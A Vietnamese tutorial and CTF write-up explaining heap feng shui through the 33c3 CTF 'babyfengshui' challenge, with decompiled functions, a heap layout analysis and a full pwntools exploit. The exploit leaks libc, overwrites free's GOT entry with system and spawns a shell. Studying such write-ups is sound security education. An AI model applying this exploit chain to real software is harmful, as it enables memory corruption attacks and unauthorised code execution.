# Heap Feng Shui
-	Heap Feng Shui là kĩ thuật dùng để tạo điều kiện cho exploit bằng cách manipulate các chunk được allocate ở trong heap layout, có thể nói kĩ thuật này chỉ bổ trợ cho các kĩ thuật khác.
-	với kĩ thuật này, ta có thể tăng độ phức tạp và độ tin cậy chính xác khi exploit.

## Implementation

-	"OOL Port Feng Shui" dùng kĩ thuật này thông qua 8 bytes overflow
	-	Heap's layout was manipulated ( Heap Feng Shui) for effective overflow (nguyên nghĩa hay nhất)
	-	địa chỉ của IPC object được lưu trong bộ nhớ của kernel được dùng để trỏ vào 1 fake IPC object khi đang ở Usermode
	-	điều này dẫn đến ta có thể read, write bộ nhớ của kernel

implementation|references
---|---
**OOL Port Feng Shui**|http://iosre.com/t/osg-macos-10-12-2-xnu-port/8171<br>https://github.com/zhengmin1989/macOS-10.12.2-Exp-via-mach_voucher |
**Heap Feng Shui in JavaScript**|https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf<br>http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html |

## Proof of Concept
để hiểu rõ hơn về kĩ thuật này, trong bài viết này sẽ dùng 1 case ctf
### Sample code(33c3 CTF - babyfengshui - 2016)
-	[babyfengshui](https://www.lazenca.net/download/attachments/19300396/babyfengshui?version=1&modificationDate=1532940330511&api=v2)
-	[libc-2.19.so](https://www.lazenca.net/download/attachments/19300396/libc-2.19.so?version=1&modificationDate=1532940331140&api=v2)

### file information
```bash
lazenca0x0@ubuntu:~/Exploit/HeapFensui$ file ./babyfengshui
./babyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped
 
lazenca0x0@ubuntu:~/Exploit/HeapFensui$ checksec --file ./babyfengshui
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[*] '/home/lazenca0x0/Exploit/HeapFensui/babyfengshui'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
lazenca0x0@ubuntu:~/Exploit/HeapFensui$
```
### binary analysis (find vuln)
>**Main()**

-	hàm puts() sẽ in ra menu các chức năng của chương trình
-	trong đây, chúng ta có 5 hàm như sau:
	-	Add a user
	-	Delete a user
	-	Display a user
	-	Update a user description
	-	Exit
-	scanf() để input giá trị
```c
void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h]
  int menuID; // [esp+4h] [ebp-14h]
  size_t userInput; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]
 
  v3 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    if ( __isoc99_scanf("%d", &menuID) == -1 )
      break;
    if ( !menuID )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", &userInput, &v0);
      AddAUser(userInput);
    }
    if ( menuID == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &userInput);
      DeleteAUser(userInput);
    }
    if ( menuID == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &userInput);
      DisplayAUser(userInput);
    }
    if ( menuID == 3 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &userInput);
      UpdateAUserDescription(userInput);
    }
    if ( menuID == 4 )
    {
      puts("Bye");
      exit(0);
    }
    if ( (unsigned __int8)cnt > 49u )
    {
      puts("maximum capacity exceeded, bye");
      exit(0);
    }
  }
  exit(1);
}
```

>**AddAUser()**

-	trước khi phân tích hàm này, thì chương trình có cấu trúc struct như sau
	-	phần phân tích tại sao lại biết được cấu trúc này thì sẽ không giải thích trong bài viết này (cần nhất cái này thì lại không có :/)
```c
struct USER{
  char *desc;
  char name[124];
};
```
-	phân tích:
	-	trước khi hàm được gọi, giá trị input từ hàm main được truyền vào biến `a1`
	-	bằng cách dùng hàm malloc(), heap sẽ allocate theo giá trị `a1` được pass vào và lưu vào desc
	-	malloc() kế tiếp sẽ allocate 128 byte của `struct USER` và được lưu vào userInfo
		-	lưu vào userInfo->desc
	-	giá trị của biến userInfo được lưu vào biết global gUserList[]
	-	dùng hàm setName() để lưu giá trị vào userInfo->name
	-	lưu giá trị của userInfo->desc thông qua UpdateAUserDescription()
```c
USER *__cdecl AddAUser(size_t a1)
{
  char *desc; // ST24_4
  USER *userInfo; // ST28_4
 
  desc = (char *)malloc(a1);
  memset(desc, 0, a1);
  userInfo = (USER *)malloc(128u);
  memset(userInfo, 0, 128u);
  userInfo->desc = desc;
  gUserList[gCnt] = userInfo;
  printf("name: ");
  setText(gUserList[gCnt]->name, 124);
  UpdateAUserDescription(++gCnt - 1);
  return userInfo;
}
```
>**DeleteAUser()**

-	nếu giá trị input từ hàm main() nhỏ hơn giá trị gCnt và giá trị của gUserList[number] khác 0 thì sẽ thực thi được hàm này
-	giải phóng `gUserList[number]->desc` bằng free()
-	lưu giá trị 0 vào gUserList[number]
```c
unsigned int __cdecl DeleteAUser(unsigned __int8 number)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]
 
  v2 = __readgsdword(0x14u);
  if ( number < gCnt && gUserList[number] )
  {
    free(gUserList[number]->desc);
    free(gUserList[number]);
    gUserList[number] = 0;
  }
  return __readgsdword(0x14u) ^ v2;
}
```
>**DisplayAUser()**
-	giá trị lưu tại `gUserList[number]->name`, `gUserList[number]->desc` được in ra bởi printf()
```c
unsigned int __cdecl DisplayAUser(unsigned __int8 number)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]
 
  v2 = __readgsdword(0x14u);
  if ( number < gCnt && gUserList[number] )
  {
    printf("name: %s\n", gUserList[number]->name);
    printf("description: %s\n", gUserList[number]->desc);
  }
  return __readgsdword(0x14u) ^ v2;
}
```
>**UpdateAUserDescription()**
-	thực hiện if() nếu giá trị cnt truyền từ main() nhỏ hơn giá trị của gCnt và kiểm tra xem giá trị của gUserList[number] có khác 0.
-	input length chuỗi cần update
-	hàm if() kế tiếp thực chất để kiểm tra xem giá trị input length ở trên có xâm phạm vào userInfo hay không. **đây chính là nơi mà vuln xuất hiện**, bởi vì chúng ta không có chắc chắn rằng userInfo sẽ bị allocate phía sau desc

### Analyze vulnerabilities
>**Heap layout**

-	thông thường, khi allocate user, Description và userInfo sẽ được allocate tuần tự như hình dưới.
-	Tuy nhiên, khi user đầu tiên bị xóa, thì vùng nhớ heap được allocate sẽ bị giải phóng, lúc này fastbin[0] và unsortedbin(136) được đưa vào
-	và khi ta allocate 1 user mới, thì khu vực unsortedbin(136) đó sẽ được assigned vào `desc`
-	thông tin của các user khác thì nằm giữa desc và name
-	điều này khiến ta có thể exploit được heap, cái mà heap feng shui đại diện cho.
	-	bạn có thể bypass được các điều kiện bên dưới cho dù bạn input giá trị lớn hơn `desc` khi tạo giá trị của `textLength`
		-	`&gUserList[cnt]->desc[textLength] >= &gUserList[cnt] - 4` 
	-	và khi bạn bypass được điều kiện trên, thì heap overflow.
-	**không phải tất cả dạng heap feng shui đều thể hiện như thế này**
	-	ví dụ ở đây chỉ phù hợp trong ngữ cảnh này
	-	heap layout hay còn được gọi là heap feng shui, nó có thể ảnh hưởng đến exploit của chúng ta

![](https://i.imgur.com/srYgI1u.png)

**cấu trúc để exploit**

1.	Heap feng shui
2.	Heap overflow
	-	overwrite \*desc
3.	leak libc
4.	overwrite GOT
	-	system

**source py:**
```py
from pwn import *
 
#context.log_level = 'debug'
 
def addUser(desc, name, text):
    p.recvuntil('Action: ')
    p.sendline('0')
    p.recvuntil('size of description: ')
    p.sendline(str(desc))
    p.recvuntil('name: ')
    p.sendline(name)
    p.recvuntil('text length: ')
    p.sendline(str(len(text)))
    p.recvuntil('text: ')
    p.sendline(text)
 
def delUser(idx):
    p.recvuntil('Action: ')
    p.sendline('1')
    p.recvuntil('index: ')
    p.sendline(str(idx))
 
def displayUser(idx):
    p.recvuntil('Action: ')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(idx))
    p.recvuntil('description: ')
    addr = p.recvline()
    return addr[:4]
 
def updateDesc(idx,size,text):
    p.recvuntil('Action: ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('text length: ')
    p.sendline(str(size))
    p.recvuntil('text: ')
    p.sendline(text)
 
p = process('./babyfengshui')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
 
#Heap Feng Shui
addUser(10,'A'*10,'B'*10)
addUser(10,'A'*10,'B'*10)
addUser(len('/bin/sh'),'/bin/sh','/bin/sh')
 
#free()
delUser(0)
 
#Heap Overflow
addUser(120, 'HeapOverflow', 'A'*152+p32(0x804b010))
 
#Leak libc address
libcAddr = displayUser(1)
 
free = u32(libcAddr)
libcBase = free - libc.sym['free']
system = libcBase + libc.sym['system']
 
log.info('Libc base : '+hex(libcBase))
log.info('free() : '+hex(free))
log.info('system() : '+hex(system))
 
#Overwrite free.got
updateDesc(1,4,p32(system))
 
#system('/bin/sh')
delUser(2)
 
#Get shell
p.interactive()
```
```bash
lazenca0x0@ubuntu:~/Exploit/HeapFensui$ python exploit.py
[+] Starting local process './babyfengshui': pid 8750
[*] '/lib/i386-linux-gnu/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc base : 0xf7d48000
[*] free() : 0xf7db8750
[*] system() : 0xf7d82940
[*] Switching to interactive mode
$ id
uid=1000(lazenca0x0) gid=1000(lazenca0x0) groups=1000(lazenca0x0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
```
## References
-	**Heap feng shui**
	-	https://en.wikipedia.org/wiki/Heap_feng_shui
	-	https://cansecwest.com/slides/2014/The%20Art%20of%20Leaks%20-%20read%20version%20-%20Yoyo.pdf
	-	https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf
	-	https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Whitepaper/bh-eu-07-sotirov-WP.pdf
-	**babyheapfengshui**
	-	https://github.com/ctfs/write-ups-2016/tree/master/33c3-ctf/pwn/babyfengshui-150
	-	http://bruce30262.logdown.com/posts/1256093-33c3-ctf-2016-babyfengshui
	-	https://galhacktictrendsetters.wordpress.com/2017/01/05/33c3-ctf-babyfengshui/
	-	https://github.com/murmus/ctf/tree/master/events/33c3ctf/babyfengshui
-	**ssctf final pwn**
	-	http://ww9210.cn/2016/04/15/ssctf-2016-final-pwn-writeup/
-	**OOL Port Feng Shui**
	-	https://webcache.googleusercontent.com/search?q=cache:R8asFUIQdysJ:https://jaq.alibaba.com/community/art/show%3Farticleid%3D781+&cd=1&hl=ko&ct=clnk&gl=jp
-	**[live] solve babyfengshui**

	[![LiveOverFlow](http://img.youtube.com/vi/zWgS6fTw4Ts/0.jpg)](http://www.youtube.com/watch?v=zWgS6fTw4Ts)
